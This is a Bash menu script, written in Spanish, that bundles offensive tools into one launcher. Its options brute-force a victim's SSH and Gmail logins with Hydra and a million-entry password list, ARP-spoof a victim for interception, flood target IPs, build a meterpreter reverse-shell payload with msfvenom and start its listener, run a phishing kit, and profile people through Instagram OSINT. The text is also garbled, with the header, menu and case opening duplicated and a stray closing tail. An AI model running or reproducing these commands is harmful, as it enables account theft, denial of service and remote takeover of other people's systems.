#!/bin/bash

clear

# Colores
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

while true
do
    clear
    echo -e "${CYAN}"
    echo " ----------------------------------------------------------"
    echo "|                  (っ◔◡◔)っ  Menu                         |"
    echo "|----------------------------------------------------------|"
    echo "|                         ${GREEN}OPCIONES${CYAN}                         |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}30${CYAN} - Salir                                               |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}25${CYAN} - Decider CISA                                        |"
    echo "| ${GREEN}24${CYAN} - Phishing                                            |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}23${CYAN} - OSINT Instagram                                     |"
    echo "| ${GREEN}22${CYAN} - OSINT Install                                       |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}21${CYAN} - TCP Attack                                          |"
    echo "| ${GREEN}20${CYAN} - UDP Attack                                          |"
    echo "| ${GREEN}19${CYAN} - ICMP Attack                                         |"
    echo "| ${GREEN}18${CYAN} - ARP Attack                                          |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}17${CYAN} - Hydra GMAIL                                         |"
    echo "| ${GREEN}16${CYAN} - Borrar metadatos (no borra todos)                   |"
    echo "| ${GREEN}15${CYAN} - Cambiar metadato de archivo                         |"
    echo "| ${GREEN}14${CYAN} - Ver metadatos de un archivo                         |"
    echo "| ${GREEN}13${CYAN} - Extraer texto de imagen                             |"
    echo "| ${GREEN}12${CYAN} - Fusionar texto a imagen                             |"
    echo "| ${GREEN}11${CYAN} - Mostrar contenido oculto de una imagen              |"
    echo "| ${GREEN}10${CYAN} - Añadir contenido a una imagen                       |"
    echo "|  ${GREEN}9${CYAN} - Ejecutar Exploit                                    |"
    echo "|  ${GREEN}8${CYAN} - Crear Exploit                                       |"
    echo "|  ${GREEN}7${CYAN} - Sherlock                                            |"
    echo "|  ${GREEN}6${CYAN} - Restablecer red                                     |"
    echo "|  ${GREEN}5${CYAN} - Dejar sin red                                       |"
    echo "|  ${GREEN}4${CYAN} - Ver S.O de un equipo                                |"
    echo "|  ${GREEN}3${CYAN} - Nmap toda la red                                    |"
    echo "|  ${GREEN}2${CYAN} - SSH DirectAT                                        |"
    echo "|  ${GREEN}1${CYAN} - Hydra SSH                                           |"
    echo "|  ${GREEN}0${CYAN} - Instalar dependencias                               |"
    echo " ----------------------------------------------------------"
    echo -e "${NC}"

    read -p "Escoge opción: " opcion

    case $opcion in
#!/bin/bash

clear

# Colores
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m' # No Color

while true
do
    clear
    echo -e "${CYAN}"
    echo " ----------------------------------------------------------"
    echo "|                  (っ◔◡◔)っ  Menu                         |"
    echo "|----------------------------------------------------------|"
    echo "|                         ${GREEN}OPCIONES${CYAN}                         |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}30${CYAN} - Salir                                               |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}25${CYAN} - Decider CISA                                        |"
    echo "| ${GREEN}24${CYAN} - Phishing                                            |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}23${CYAN} - OSINT Instagram                                     |"
    echo "| ${GREEN}22${CYAN} - OSINT Install                                       |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}21${CYAN} - TCP Attack                                          |"
    echo "| ${GREEN}20${CYAN} - UDP Attack                                          |"
    echo "| ${GREEN}19${CYAN} - ICMP Attack                                         |"
    echo "| ${GREEN}18${CYAN} - ARP Attack                                          |"
    echo "|----------------------------------------------------------|"
    echo "| ${GREEN}17${CYAN} - Hydra GMAIL                                         |"
    echo "| ${GREEN}16${CYAN} - Borrar metadatos (no borra todos)                   |"
    echo "| ${GREEN}15${CYAN} - Cambiar metadato de archivo                         |"
    echo "| ${GREEN}14${CYAN} - Ver metadatos de un archivo                         |"
    echo "| ${GREEN}13${CYAN} - Extraer texto de imagen                             |"
    echo "| ${GREEN}12${CYAN} - Fusionar texto a imagen                             |"
    echo "| ${GREEN}11${CYAN} - Mostrar contenido oculto de una imagen              |"
    echo "| ${GREEN}10${CYAN} - Añadir contenido a una imagen                       |"
    echo "|  ${GREEN}9${CYAN} - Ejecutar Exploit                                    |"
    echo "|  ${GREEN}8${CYAN} - Crear Exploit                                       |"
    echo "|  ${GREEN}7${CYAN} - Sherlock                                            |"
    echo "|  ${GREEN}6${CYAN} - Restablecer red                                     |"
    echo "|  ${GREEN}5${CYAN} - Dejar sin red                                       |"
    echo "|  ${GREEN}4${CYAN} - Ver S.O de un equipo                                |"
    echo "|  ${GREEN}3${CYAN} - Nmap toda la red                                    |"
    echo "|  ${GREEN}2${CYAN} - SSH DirectAT                                        |"
    echo "|  ${GREEN}1${CYAN} - Hydra SSH                                           |"
    echo "|  ${GREEN}0${CYAN} - Instalar dependencias                               |"
    echo " ----------------------------------------------------------"
    echo -e "${NC}"

    read -p "Escoge opción: " opcion

    case $opcion in
        0)
            echo -e "${GREEN}Actualizando librerías...${NC}"
            sleep 2
            sudo apt update

            echo -e "${GREEN}Instalando Metasploit...${NC}"
            sleep 2

            # Tu código para instalar Metasploit

            echo -e "${GREEN}Instalando Hydra...${NC}"
            sleep 2
            sudo apt install --yes hydra

            echo -e "${GREEN}Instalando NMAP...${NC}"
            sleep 2
            sudo apt install --yes nmap

            echo -e "${GREEN}Instalando DSNIFF...${NC}"
            sleep 2
            sudo apt install --yes dsniff

            echo -e "${GREEN}Instalando SSH...${NC}"
            sleep 2
            sudo apt install --yes ssh

            echo -e "${GREEN}Instalando NFTABLES...${NC}"
            sleep 2
            sudo apt install --yes nftables

            echo -e "${GREEN}Instalando EXIFTOOL...${NC}"
            sleep 2
            sudo apt install --yes libimage-exiftool-perl

            echo -e "${GREEN}Instalando HPING3...${NC}"
            sleep 2
            sudo apt install --yes hping3

            echo -e "${GREEN}Instalando Sherlock...${NC}"
            sleep 2
            git clone https://github.com/sherlock-project/sherlock.git
            python3 -m pip install -r sherlock/requirements.txt

            wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
            mv 10-million-password-list-top-1000000.txt diccionario.txt

            sleep 2

            sudo apt install curl
            sudo apt install git python3 php openssh-client -y
            git clone https://github.com/KasRoudra/PyPhisher
            cd PyPhisher
            pip3 install -r files/requirements.txt
            cd ..
            git clone https://github.com/cisagov/decider.git
            sudo pip3 install -r decider/requirements.txt
            ;;
        1)
            clear
            read -p "Usuario: " usuario
            read -p "IP: " ip
            hydra -V -f -l $usuario -P diccionario.txt -o results.txt $ip ssh
            ;;
        2)
            clear
            read -p "Dime la contraseña: " contra
            read -p "Dime el usuario: " usu
            read -p "Dime la IP: " ip
            read -p "Que comando quieres usar: " comand
            watch -n 0.1 sshpass -p $contra ssh -t $usu@$ip " $comand "
            ;;
        3)
            clear
            read -p "Dime el nombre de la Red: " red
            read -p "Parametros? (T4,sP): " parametro
            nmap -$parametro $red/24
            sleep 60
            ;;
        4)
            clear
            read -p "Dime el equipo que quieres comprobar: " eq
            nmap -T4 -O $eq
            ;;
        5)
            #read -p "Dime la ip del gateway: " gateway
            read -p "Dime la ip de la victima: " victima
            arpspoof -t $victima 192.168.12.10 2> /dev/null &
            arpspoof -t 192.168.12.10 $victima 2> /dev/null &
            sysctl net.ipv4.ip_forward=1
            nft -f redir80443.txt
            ;;
        6)
            killall arpspoof
            ;;
        7)
            read -p "Dime el usuario que quieres investigar: " usr
            cd sherlock
            python3 sherlock $usr
            sleep 60
            cd ..
            ;;
        8)
            read -p "Dime como quieres que se llame el exploit: " exp
            read -p "Dime tu IP: " ip
            msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip -f elf -o ~/$exp
            ;;
        9)
            read -p "Dime tu dirección IP: " ip
            echo -e "${GREEN}use exploit/multi/handler${NC}" > exploit.rc
            echo -e "${GREEN}set PAYLOAD linux/x64/meterpreter/reverse_tcp${NC}" >> exploit.rc
            echo -e "${GREEN}set LHOST $ip${NC}" >> exploit.rc
            echo -e "${GREEN}run${NC}" >> exploit.rc
            msfconsole -q -r exploit.rc
            ;;
        10)
            read -p "Dime el texto que quieres meter en una imagen: " texto
            read -p "Dime el nombre de la imagen: " nimagen
            read -p "Dime el nombre de la imagen Final: " fimagen
            echo "$texto" > .topsecret.txt && cat $nimagen .topsecret.txt > $fimagen
            ;;
        11)
            read -p "Dime nombre de la imagen: " img
            strings $img
            sleep 10
            ;;
        12)
            read -p "Dime el texto que quieres meter en una imagen: " texto
            read -p "Dime el nombre de la imagen: " nimagen
            read -p "Dime el nombre del archivo oculto O si el nombre de uno que quieras utilizar: " arch
            echo $texto > $arch
            steghide embed -ef $arch -cf $nimagen
            ;;
        13)
            read -p "Dime nombre del archivo: " img
            steghide extract -sf $img
            sleep 5
            ;;
        14)
            read -p "Dime nombre del archivo: " img
            exiftool -s $img
            sleep 10
            ;;
        15)
            read -p "Dime nombre del archivo: " arch
            read -p "Dime el nombre del metadato que quieres modificar: " meta
            read -p "Dime el nuevo valor que quieres añadirle: " valor
            exiftool -$meta=$valor $arch
            ;;
        16)
            read -p "Dime el del archivo: " arch
            exiftool -all= $arch
            ;;
        17)
            read -p "Dime el correo electronico de la victima: " visti
            hydra -s 465 -S -v -V -l $visti -P diccionario.txt -e s -f -t 16 smtp.gmail.com smtp
            sleep 20
            ;;
        18)
            read -p "Dime la ip de la Víctima: " ip
            nping --arp --rate 3000 -c 100000 $ip
            ;;
        19)
            read -p "Dime la ip de la Víctima: " ip
            sudo ping -f $ip
            ;;
        20)
            read -p "Dime la ip de la Víctima: " ip
            nping --udp --flags syn --rate 3000 -c 100000 $ip
            ;;
        21)
            read -p "Dime la ip de la Víctima: "  ip
            nping --tcp --flags syn --rate 3000 -c 100000 $ip
            ;;
        22)
            git clone https://github.com/Datalux/Osintgram.git
            sudo pip install geopy
            cd Osintgram
            sudo pip3 install instagram_private_api
            sudo pip3 install PrettyTable
            sudo pip3 install -r requirements.txt
            sleep 5
            clear
            echo "Acuerdate de ir al directorio Osintgram y ejecutar el cómando make setup con la cuenta del bot de instagram"
            sleep 20
            cd ..
            ;;
        23)
            read -p "Dime el usuario de la victima: " urs
            cd Osintgram/
            python3 main.py $urs
            sleep 10
            cd ..
            ;;
        24)
            python3 PyPhisher/pyphisher.py
            ;;
        25)
            # Tu código para Decider CISA
            ;;
        30)
            exit
            ;;
        *)
            echo -e "${RED}Opción no válida. Introduce un número válido.${NC}"
            sleep 2
            ;;
    esac
done

            echo -e "${RED}Opción no válida. Introduce un número válido.${NC}"
            sleep 2
            ;;
    esac
done
